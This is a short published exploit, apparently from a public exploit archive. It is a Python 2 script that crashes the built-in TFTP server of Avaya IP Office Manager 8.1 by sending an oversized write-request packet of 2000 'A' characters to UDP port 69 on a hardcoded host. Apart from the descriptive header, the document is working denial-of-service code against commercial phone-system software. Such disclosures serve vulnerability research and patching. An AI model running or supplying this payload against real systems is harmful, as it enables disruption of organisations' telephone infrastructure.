#Exploit Title: Avaya IP Office Manager TFTP DOS
#Version: Avaya IP Office Manager 8.1 (5)
#Author: Craig Freyman (cd1zz)
#Date: March 23, 2011
#Description: Avaya IP Office Manager is the management console for Avaya IP Office phone systems. 
#There is a built in TFTP server that is used to update the firmware on phones. The TFTP service 
#is loaded when the admin console is opened. I was not able to overwrite any registers or the SEH.
#Software Link: ftp://ftp.avaya.com/incoming/Up1cku9/SoftwarePub/6_1GA_Builds/ADMIN6_1_5.exe
#Tested on: Windows XP SP3

#!/usr/bin/python
import socket

host = '192.168.133.131'
port = 69

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

crash = "A" * 2000

print "Sending crash...."
pwned = "\x00\x02" + "A" + "\x00" + crash + "\x00"
s.sendto(pwned, (host, port))